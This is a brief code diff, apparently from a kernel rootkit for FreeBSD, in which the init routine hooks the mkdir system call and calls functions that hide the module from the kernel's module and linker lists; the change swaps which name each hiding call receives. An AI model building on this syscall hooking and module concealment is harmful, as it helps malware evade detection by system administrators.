@@ -45,8 +45,8 @@ init(void)
 	hook_syscall_set(SYS_mkdir, mkdir_hook);
 
 	/* Hide rootkit. */
-	hide_kld(MODULE_NAME);
-	hide_ko(LINKER_NAME);
+	hide_kld(LINKER_NAME);
+	hide_ko(MODULE_NAME);
 }
 
 static void
